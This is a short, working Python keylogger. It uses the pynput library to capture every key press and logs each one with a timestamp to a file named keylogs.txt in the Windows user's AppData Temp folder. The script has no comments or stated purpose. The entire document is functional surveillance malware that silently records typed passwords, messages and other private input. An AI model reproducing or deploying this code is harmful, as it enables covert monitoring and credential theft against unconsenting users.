from pynput.keyboard import Key, Listener
import logging, os

logging.basicConfig(filename = (os.environ['USERPROFILE'] + "\\AppData\\Local\\Temp\\" + "keylogs.txt"),\
    level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
